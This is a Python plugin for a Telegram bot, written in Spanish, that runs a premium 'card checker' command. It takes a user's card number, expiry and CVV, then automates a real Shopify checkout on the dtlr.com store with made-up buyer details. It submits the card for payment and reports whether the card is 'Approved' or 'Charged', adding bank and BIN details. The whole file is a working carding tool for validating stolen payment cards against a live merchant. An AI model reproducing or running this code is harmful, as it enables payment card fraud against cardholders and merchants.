from plugins.defs1 import get_cc, luhn, bininfo
from pyrogram import Client, filters
import aiohttp
import requests
import plugins.sql.gates as gates
from pyrogram.types import Message
import time
import random
from faker import Faker
from plugins.clases.usuarios import usuario
def buscar(res, primer, final):
    try:
        inicio = res.index( primer ) + len( primer )
        fin = res.index( final, inicio )
        return res[inicio:fin]
    except ValueError:
        return None

gate = "Shopify+Payeezy"
emojis1 = ["🙈", "💦", "🌏", "🐸", "🐧"]
emojis2 = ["😠", "☔", "☀", "🌈"]
rnd_emoji1 = random.choice(emojis1)
rnd_emoji2 = random.choice(emojis2)
r = requests.Session()
@Client.on_message(filters.command(["ezz"], prefixes=["/", "."]))
async def premium(_, m: Message):
    Status = gates.buscarT("ezz")
    try:
        Estado = Status[2]
    except Exception: return await m.reply('<b>Error al encontrar el Gate</b>')
    if Estado == 'off': return await m.reply(f'𝑬𝒔𝒕𝒆 𝒄𝒐𝒎𝒂𝒏𝒅𝒐 𝒆𝒔𝒕𝒂 𝒅𝒆𝒔𝒂𝒄𝒕𝒊𝒗𝒂𝒅𝒐 𝒕𝒆𝒎𝒑𝒐𝒓𝒂𝒍𝒎𝒆𝒏𝒕𝒆\n𝑹𝒂𝒛𝒐́𝒏: <i>{Status[3]}</i>')
    start_time = time.time()
    user = m.from_user.username
    id = m.from_user.id
    user = usuario(nombre=user, id=id)
    rango = user.buscar()
    if not rango or rango == False: return await m.reply('<b>Usuario no registrado porfavor registrese</b>')
    if rango[2] == 'Free':
        return await m.reply('<b>Necesita ser Premium para utilizar este gate</b>')
    rangoC = rango[5]
    if rangoC == None:
        rangoC = rango[2]
    try:
        cc, mes, año, cvv = get_cc(m.text)
        veri = luhn(cc)
        if not cc or not mes or not año or not cvv: return await m.reply('<b>Formato invalido</b>')
        if veri == False: return await m.reply("<b>Algoritmo Luhn invalido ❌</b>")
    except Exception:
        return await m.reply("<b>Formato invalido\nCC|MES|AÑO|CVV</b>")
    respuesta = await m.reply(f"""<b>Checkeando CC | ⏳</b>""")
    fake = Faker()
    email = fake.ascii_free_email()
    product_link = "https://www.dtlr.com/collections/men/products/nike-dri-fit-head-tie-3-0-red?variant=30973789700175"
    r1 = r.get(product_link)
    varient_id = buscar(r1.text, 'variantId":',',')
    if not r1 or not varient_id: return await m.reply('<b>Error al checkear1</b>')
    
    b_data = {
    "form_type": "product",
    "utf8": "✓",
    "option-0": "9-11",
    "id": varient_id,
    "properties[shipping_method]": "me",
    "properties[store_pickup]": "",
    "quantity": "1"
}
    b_head = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
'x-requested-with': 'XMLHttpRequest'
    }
    
    r2 = r.post(f'https://www.dtlr.com/cart/add', headers =b_head,data =b_data)
    if not r2: return await m.reply('<b>Error al checkear2</b>')

    d_data = {
'updates[]': '1',
'checkout': 'Check Out'
}
    d_head = {
    'x-requested-with': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0'
    }

    r3 = r.post(f'https://www.dtlr.com/cart', headers=d_head, data=d_data)
    auth_token = buscar(r3.text, 'type="hidden" name="authenticity_token" value="','"')
    if not r3 or not auth_token: return await m.reply('<b>Error al checkear</b>')   
    checkout_url = r3.url
    taken1 = int(time.time()) - start_time
    await respuesta.edit(f"<b>Checkeando CC 20% | {rnd_emoji1}\nTiempo: {taken1:0.3}</b>")

    t1_data = {
	"_method": "patch",
	"authenticity_token": auth_token,
	"previous_step": "contact_information",
	"step": "shipping_method",
	"checkout[email]": email,
	"checkout[shipping_address][first_name]": [
		"",
		"Martin"
	],
	"checkout[shipping_address][last_name]": [
		"",
		"Garcia"
	],
	"checkout[shipping_address][company]": [
		"",
		""
	],
	"checkout[shipping_address][address1]": [
		"",
		"New+York+Hotel+&+Casino"
	],
	"checkout[shipping_address][address2]": [
		"",
		""
	],
	"checkout[shipping_address][city]": [
		"",
		"Las Vegas"
	],
	"checkout[shipping_address][country]": [
		"",
		"United States"
	],
	"checkout[shipping_address][province]": [
		"",
		"NV"
	],
	"checkout[shipping_address][zip]": [
		"",
		"89109"
	],
	"checkout[shipping_address][phone]": [
		"",
		"(717)+123-1234"
	],
	"checkout[remember_me]": [
		"false",
		"0"
	],
	"checkout[client_details][browser_width]": "1920",
	"checkout[client_details][browser_height]": "309",
	"checkout[client_details][javascript_enabled]": "1",
	"checkout[client_details][color_depth]": "24",
	"checkout[client_details][java_enabled]": "false",
	"checkout[client_details][browser_tz]": "180"
}
    r4 = r.post(checkout_url, data=t1_data)
    if not r4 or not "step=shipping_method" in r4.url: return await m.reply('<b>Error al checkear</b>') 
    taken2 = int(time.time()) - start_time
    await respuesta.edit(f"<b>Checkeando CC 40% | {rnd_emoji2}\nTiempo: {taken2:0.3}</b>")
    t_data = {
	"_method": "patch",
	"authenticity_token": auth_token,
	"previous_step": "shipping_method",
	"step": "payment_method",
	"checkout[shipping_rate][id]": "ups_shipping-03-10.68",
	"checkout[client_details][browser_width]": "1920",
	"checkout[client_details][browser_height]": "994",
	"checkout[client_details][javascript_enabled]": "1",
	"checkout[client_details][color_depth]": "24",
	"checkout[client_details][java_enabled]": "false",
	"checkout[client_details][browser_tz]": "180"
}
    t = r.post(checkout_url, data=t_data)
    if not t: return await m.reply('<b>Error al checkear</b>') 
    payment_gateway = buscar(t.text,'data-subfields-for-gateway="','"')
    if not payment_gateway:
        t2 = r.get(checkout_url+"?previous_step=shipping_method&step=payment_method")
        payment_gateway = buscar(t2.text,'data-subfields-for-gateway="','"')
        if not payment_gateway:
            return await m.reply('<b>Error al checkear</b>') 
    nombre = str(fake.name())

    json_four = {"credit_card": {"month": mes,"name": nombre,"number": cc,"verification_value": cvv,"year": año},"payment_session_scope": "www.dtlr.com"
}

    four = r.post('https://deposit.us.shopifycs.com/sessions', json = json_four)
    
    if "id" not in four.json(): return await m.reply('Error al checkear')
    id = four.json()["id"] 
    taken3 = int(time.time()) - start_time
    await respuesta.edit(f"<b>Checkeando CC 85% | {rnd_emoji2}\nTiempo: {taken3:0.3}</b>")

    dic = {
	"_method": "patch","authenticity_token": auth_token,
	"previous_step": "payment_method","step": "","s": id,
	"checkout[payment_gateway]": payment_gateway,
	"checkout[credit_card][vault]": "false",
	"checkout[different_billing_address]": "false",
	"checkout[total_price]": "2093","complete": "1",
	"checkout[client_details][browser_width]": "1920",
	"checkout[client_details][browser_height]": "518",
	"checkout[client_details][javascript_enabled]": "1",
	"checkout[client_details][color_depth]": "24",
	"checkout[client_details][java_enabled]": "false",
	"checkout[client_details][browser_tz]": "180"
}
    f = r.post(checkout_url, data = dic)
    response_r1 = buscar(f.text, 'class="notice__text">', "<")
    if not f or 'processing' not in f.url and response_r1 == None: return await m.reply('Error al checkear')
    time.sleep(4)
    g = r.get(checkout_url + '/processing?from_processing_page=1')
    time.sleep(6)
    charge_Link=None
    if "Thank you" in g.text: charge_Link = "Charged"
    if not charge_Link:
        if not g or 'from_processing_page=1&validate=true' not in g.url: print(g.text); return await m.reply('Error al checkear')
    complete = f"{cc}|{mes}|{año}|{cvv}"
    getBin =  bininfo(cc)
    if "Error" in getBin: return await respuesta.edit('<b>Error al obtener la informacion del bin</b>')
    bin, brand, type, level, bank, pais, country, emojiCountry, currency = getBin
    response_error = buscar(g.text, 'class="notice__text">', "<")
    r_logo, r_message, r_res = "❌", 'Declined', response_error
    if charge_Link != None: r_logo, r_message, r_res = "✅", "Approved", "CHARGED $4.98" 
    if response_error == "Transaction Normal - Insufficient Funds": r_logo, r_message, r_res = "✅", "Approved", response_error
    if response_error == "Addres not Verified - Approved": r_logo, r_message, r_res = "✅", "Approved", response_error
    if response_error == "Address not Verified - Insufficient Funds": r_logo, r_message, r_res = "✅", "Approved", response_error
    if response_r1 != None: response_error = response_r1
    taken4 = int(time.time()) - start_time
    nombre = m.from_user.first_name
    if nombre == None: nombre = ""
    apellido = m.from_user.last_name
    if apellido == None: apellido = ""
    await respuesta.edit(f'𝐂𝐚𝐫𝐝: <code>{complete}</code>\n𝐒𝐭𝐚𝐭𝐮𝐬: {r_message} {r_logo}\n𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {r_res}\n𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {gate}\n<b>------> 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 <------</b>\n𝐁𝐢𝐧: <code><i>{bin}</i></code>\n𝐁𝐢𝐧 𝐢𝐧𝐟𝐨: <code><i>{brand} - {type} - {level}</i></code>\n𝐁𝐚𝐧𝐤: <code><i>{bank}</i></code>\n𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} {emojiCountry}</code> - <code>{currency}</code>\n<b>------> 𝐈𝐧𝐟𝐨 <------</b>\n𝐓𝐢𝐦𝐞: {taken4:0.3} 𝐒𝐞𝐠𝐬\n𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲:  <a href="tg://user?id={id}">{nombre}</a> [<b>{rangoC}</b>]\n𝐎𝐰𝐧𝐞𝐫: <code><i>Draxxd30</i></code>')